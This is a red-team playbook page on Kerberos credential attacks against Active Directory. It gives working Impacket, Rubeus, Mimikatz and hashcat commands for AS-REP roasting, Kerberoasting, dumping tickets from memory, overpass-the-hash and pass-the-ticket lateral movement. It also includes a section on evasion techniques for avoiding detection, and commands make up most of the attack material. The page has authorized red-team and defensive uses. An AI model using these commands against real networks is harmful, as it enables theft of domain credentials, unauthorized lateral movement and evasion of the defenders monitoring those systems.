# Kerberos Credential Attacks

> **MITRE ATT&CK**: Credential Access > T1558 - Steal or Forge Kerberos Tickets
> **Platforms**: Windows (Active Directory)
> **Required Privileges**: Domain User (most attacks) / Domain Admin (Golden Ticket forging)
> **OPSEC Risk**: Medium

## Strategic Overview

Kerberos is the default authentication protocol in Active Directory. Its design includes
several weaknesses that Red Team operators routinely exploit. As a Red Team Lead, you must
understand these attacks at a deep level because they form the backbone of nearly every
AD compromise: from initial credential access via Kerberoasting, through lateral movement
with pass-the-ticket, to domain persistence with Golden Tickets.

**Key Kerberos attacks covered here (quick reference):**
- **AS-REP Roasting** - Harvest hashes for accounts without pre-authentication
- **Kerberoasting** - Request service tickets, crack offline for service account passwords
- **Ticket extraction** - Steal tickets from memory for impersonation
- **Overpass-the-Hash** - Use NTLM hash to obtain Kerberos tickets
- **Pass-the-Ticket** - Inject stolen tickets for lateral movement

For a comprehensive deep-dive on Kerberos attack chains, Golden/Silver Tickets, delegation
abuse, and advanced scenarios, see: `../12-active-directory-deep-dive/kerberos-attacks-deep-dive.md`

## Technical Deep-Dive

### 1. AS-REP Roasting (T1558.004)

Targets accounts with "Do not require Kerberos preauthentication" enabled. The KDC returns
an AS-REP encrypted with the user's password hash, which can be cracked offline.

```bash
# Impacket - enumerate and roast (from Linux)
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
GetNPUsers.py corp.local/ -usersfile users.txt -format john -outputfile asrep_john.txt

# Impacket - with credentials (enumerate vulnerable accounts via LDAP)
GetNPUsers.py corp.local/user:Password123 -request -format hashcat -outputfile asrep_hashes.txt

# No credentials, no user list (attempt anonymous LDAP bind)
GetNPUsers.py corp.local/ -no-pass -request
```

```powershell
# Rubeus - from Windows (current domain)
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Target specific user
Rubeus.exe asreproast /user:svc_backup /format:hashcat

# Target specific OU
Rubeus.exe asreproast /ou:"OU=Service Accounts,DC=corp,DC=local" /format:hashcat

# PowerView - find vulnerable accounts
Get-DomainUser -PreauthNotRequired | Select samaccountname
```

```bash
# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule
john --wordlist=wordlist.txt asrep_john.txt
```

### 2. Kerberoasting (T1558.003)

Request TGS tickets for service accounts (accounts with SPNs), extract and crack offline.
Any domain user can request a service ticket for any SPN.

```bash
# Impacket - from Linux
GetUserSPNs.py corp.local/user:Password123 -request -outputfile kerberoast_hashes.txt
GetUserSPNs.py corp.local/user:Password123 -request-user svc_sql -outputfile single_hash.txt

# With pass-the-hash
GetUserSPNs.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/user -request
```

```powershell
# Rubeus - from Windows
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Target specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433

# Target specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

# Use RC4 downgrade for easier cracking (noisier but faster to crack)
Rubeus.exe kerberoast /tgtdeleg

# AES Kerberoasting (stealthier - avoids RC4 downgrade detection)
Rubeus.exe kerberoast /aes /outfile:aes_hashes.txt

# PowerView + manual request
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"
```

```bash
# Crack Kerberoast hashes
# RC4 (type 23)
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt -r rules/best64.rule
# AES256 (type 17/18)
hashcat -m 19700 aes_hashes.txt wordlist.txt -r rules/best64.rule
```

### 3. Ticket Extraction from Memory

```powershell
# Rubeus - dump all tickets from current session
Rubeus.exe dump

# Dump tickets from all logon sessions (requires elevation)
Rubeus.exe dump /luid:0x3e7

# Rubeus - dump and save to file
Rubeus.exe dump /nowrap
# Base64 ticket can be used directly with /ticket: parameter

# Mimikatz - export tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
# Exports .kirbi files for each ticket found

# Mimikatz - list tickets
mimikatz.exe "kerberos::list" "exit"

# Cobalt Strike
execute-assembly Rubeus.exe dump /nowrap
```

### 4. Ticket Format Conversion

```bash
# Convert between kirbi (Windows/Mimikatz) and ccache (Linux/Impacket) formats
# Impacket ticketConverter
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi

# Use ccache ticket with Impacket tools
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass corp.local/admin@dc01.corp.local
secretsdump.py -k -no-pass corp.local/admin@dc01.corp.local
wmiexec.py -k -no-pass corp.local/admin@dc01.corp.local
```

### 5. Overpass-the-Hash / Pass-the-Key (T1550.002)

Use an NTLM hash or AES key to request a legitimate Kerberos TGT, then use that TGT for
authentication. This avoids NTLM authentication on the wire.

```
# Mimikatz - Overpass-the-Hash
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe" "exit"
# Opens new PowerShell session authenticated as admin via Kerberos

# Mimikatz - Pass-the-Key with AES256
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /aes256:{AES256Key} /run:cmd.exe" "exit"

# Rubeus - Request TGT with hash
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:{AES256Key} /ptt

# Impacket - request TGT
getTGT.py corp.local/admin -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
export KRB5CCNAME=admin.ccache
```

### 6. Pass-the-Ticket (T1550.003)

```powershell
# Rubeus - inject ticket into current session
Rubeus.exe ptt /ticket:{base64_ticket}
Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz - inject ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Verify ticket is loaded
klist

# Use the ticket for lateral movement
dir \\dc01.corp.local\C$
Enter-PSSession -ComputerName dc01.corp.local
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| RC4 TGS requests | Event ID 4769 | Encryption type 0x17 (RC4) for Kerberoasting |
| AS-REP without pre-auth | Event ID 4768 | Pre-auth type 0 from unusual source |
| Abnormal TGS volume | Event ID 4769 | Many service ticket requests from one source |
| Ticket injection | EDR | Memory manipulation in LSASS for ticket injection |
| Overpass-the-hash | Event ID 4768 | TGT request using RC4 when AES is expected |

### Evasion Techniques

1. **AES Kerberoasting** - Request AES-encrypted tickets to avoid RC4 downgrade alerts
2. **Targeted roasting** - Request tickets for specific SPNs, not all at once
3. **Delay requests** - Space out Kerberoast requests over time
4. **Use existing tickets** - Prefer pass-the-ticket over overpass-the-hash
5. **Blend with normal traffic** - Kerberoast during business hours when TGS volume is high
6. **AES keys for pass-the-key** - Use AES256 keys instead of RC4 hashes

## Cross-References

- [DCSync](dcsync.md) - Extract krbtgt hash for Golden Ticket creation
- [Password Cracking](password-cracking.md) - Crack Kerberoast and AS-REP hashes
- [NTLM Theft](ntlm-theft.md) - Alternative credential theft via NTLM relay
- [LSASS Dumping](lsass-dumping.md) - Extract Kerberos tickets from LSASS memory
- ../12-active-directory-deep-dive/kerberos-attacks-deep-dive.md - Comprehensive deep-dive
- ../06-lateral-movement/ - Using extracted tickets for lateral movement

## References

- https://attack.mitre.org/techniques/T1558/
- https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
- https://github.com/GhostPack/Rubeus
- https://github.com/fortra/impacket
- https://www.thehacker.recipes/ad/movement/kerberos/
- https://adsecurity.org/?p=2293
